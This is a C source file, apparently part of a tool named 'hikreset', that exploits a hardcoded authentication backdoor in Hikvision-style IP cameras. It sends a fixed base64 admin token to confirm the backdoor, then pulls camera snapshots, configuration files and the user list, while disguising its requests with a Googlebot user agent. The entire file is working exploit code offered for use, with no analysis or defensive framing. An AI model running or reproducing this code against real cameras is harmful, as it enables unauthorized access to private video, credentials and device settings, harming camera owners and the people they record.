#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <curl/curl.h>
#include <stdlib.h>
#include "hikreset.h"
#include <stdio.h>


int backdoorCheck(char *ip){
	CURL *curl;
	CURLcode res;
	curl = curl_easy_init();
	char* url;
	asprintf(&url,"%s/System/deviceInfo?auth=YWRtaW46MTEK",ip);
	if(curl) {
		FILE *black_hole = fopen("/dev/null", "wb");
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, black_hole);
		res = curl_easy_perform(curl);

		if(res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
		long http_code = 0;

		curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
		curl_easy_cleanup(curl);
		free(url);

		return http_code;
	}
	else{
		return -1;
	}
}

int download(char *ip, enum downloadFile filetype, FILE* fd){
	CURL *curl;
	CURLcode res;
	curl = curl_easy_init();
	char* url;

	if (filetype==SNAPSHOT){
		asprintf(&url,"%s%s",ip,"/onvif-http/snapshot?auth=YWRtaW46MTEK");
	}
	else if (filetype==CONFIG){
		asprintf(&url,"%s%s",ip,"/System/configurationFile?auth=YWRtaW46MTEK");
	}
	else {
		return -1;
	}
	printf("Connectin to: %s",ip);
	if(curl) {
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fd);
		res = curl_easy_perform(curl);

		if(res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
		long http_code = 0;

		curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
		curl_easy_cleanup(curl);
		free(url);

		return http_code;
	}
	else{
		return -1;
	}
}

void getUsers(char *ip){
	long status_code = backdoorCheck(ip);
	if(status_code==200){
		CURL *curl;
		CURLcode res;
		curl = curl_easy_init();
		char* url;
		asprintf(&url,"%s/Security/users?auth=YWRtaW46MTEK",ip);
		
		if(curl) {
			curl_easy_setopt(curl, CURLOPT_URL, url);
			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
			res = curl_easy_perform(curl);

			if(res != CURLE_OK)
				fprintf(stderr, "curl_easy_perform() failed: %s\n",
					curl_easy_strerror(res));
			curl_easy_cleanup(curl);
			free(url);
		}
	}
	else{
			printf("%s - Backdoor not confirmed. status_code is %ld\n", ip, status_code);
		}
}